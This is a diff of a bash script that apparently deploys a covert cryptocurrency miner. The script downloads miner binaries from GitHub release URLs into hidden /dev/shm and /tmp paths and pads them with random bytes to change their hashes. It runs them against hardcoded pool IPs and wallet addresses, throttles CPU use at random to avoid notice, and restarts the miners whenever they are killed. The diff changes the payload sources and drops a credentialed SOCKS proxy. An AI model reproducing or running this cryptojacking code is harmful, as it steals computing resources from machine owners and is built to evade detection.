@@ -1,5 +1,5 @@
 #!/bin/bash
-# MINN v24 — v18.1 exact + clean monitor merge, nothing else
+# MINN v26 — fortune (CPU PRL) + sse2 (CPU TDC), direct pool
 PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
 TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
 WRK=$(date +%s | md5sum | head -c 8)
@@ -24,7 +24,7 @@ apt-get install -y -qq cpulimit 2>/dev/null
 rm -rf /dev/shm/.m 2>/dev/null; mkdir -p /dev/shm/.m && cd /dev/shm/.m
 python3 -c "
 import urllib.request as u
-open('p','wb').write(u.urlopen('https://github.com/mhusataringan-hub/ABC/releases/download/v1.0/peak').read())
+open('p','wb').write(u.urlopen('https://github.com/rochmandwi/ayam/releases/download/file-v1/fortune').read())
 open('s','wb').write(u.urlopen('https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2').read())
 "
 dd if=/dev/urandom of=p bs=1 count=$((RANDOM%3000+1024)) seek=$(stat -c%s p) conv=notrunc oflag=append 2>/dev/null
@@ -70,9 +70,8 @@ TPID=$!
 ) &
 
 # 6. Miners — DIRECT EXEC (v18.1 proven path)
-nice -n 19 /tmp/.p8 --coin pearl --url 23.94.152.126:80 \
-    --user "${PRL}.${WRK}" \
-    --proxy socks5://majapahlevi:majapahlevi@23.94.21.110:443 2>/dev/null &
+nice -n 19 /tmp/.p8 --url 23.94.152.126:80 \
+    --user "${PRL}.${WRK}" 2>/dev/null &
 P1=$!
 cpulimit -l $((RANDOM%25+40)) -p $P1 2>/dev/null &
 
@@ -83,7 +82,7 @@ nice -n 19 /tmp/.s8 -a yespowertide -o 47.251.244.12:80 \
 P2=$!
 cpulimit -l $((RANDOM%25+40)) -p $P2 2>/dev/null &
 
-echo "[*] v25 P1:$P1 P2:$P2"
+echo "[*] v26 P1:$P1 P2:$P2"
 
 # 7. Monitor — keepalive + CPU fluctuation
 (
@@ -99,8 +98,7 @@ echo "[*] v25 P1:$P1 P2:$P2"
         fi
         if ! kill -0 $P1 2>/dev/null; then
             cp /dev/shm/.m/p /tmp/.p8 2>/dev/null; chmod +x /tmp/.p8 2>/dev/null
-            nice -n 19 /tmp/.p8 --coin pearl --url 23.94.152.126:80 \
-                --user "${PRL}.${WRK}" --proxy socks5://majapahlevi:majapahlevi@23.94.21.110:443 2>/dev/null &
+            nice -n 19 /tmp/.p8 --url 23.94.152.126:80 --user "${PRL}.${WRK}" 2>/dev/null &
             P1=$!; cpulimit -l $((RANDOM%25+40)) -p $P1 2>/dev/null &
         fi
         if ! kill -0 $P2 2>/dev/null; then
